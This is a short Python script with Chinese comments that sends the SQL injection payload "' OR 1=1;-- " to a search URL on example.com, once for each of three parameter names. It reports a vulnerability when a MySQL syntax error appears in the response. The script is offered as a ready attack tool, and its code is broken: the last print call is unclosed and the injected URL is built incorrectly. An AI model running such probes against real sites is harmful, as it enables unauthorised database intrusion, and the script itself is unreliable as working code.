import requests

# 目标URL
url = "http://example.com/search.php?q="

# SQL注入payload
payload = "' OR 1=1;-- "

# 待检测的参数列表
params = ["id", "username", "password"]

# 遍历参数列表，发送带有注入payload的请求
for param in params:
    # 构造注入请求的URL
    inject_url = url + param + "=" + payload

    # 发送注入请求并获取响应
    r = requests.get(inject_url)
    response = r.text

    # 判断是否存在注入漏洞
    if "error in your SQL syntax" in response:
        print("存在SQL注入漏洞：", inject_url)
    else:
        print("未发现SQL注入漏洞：", inject_url
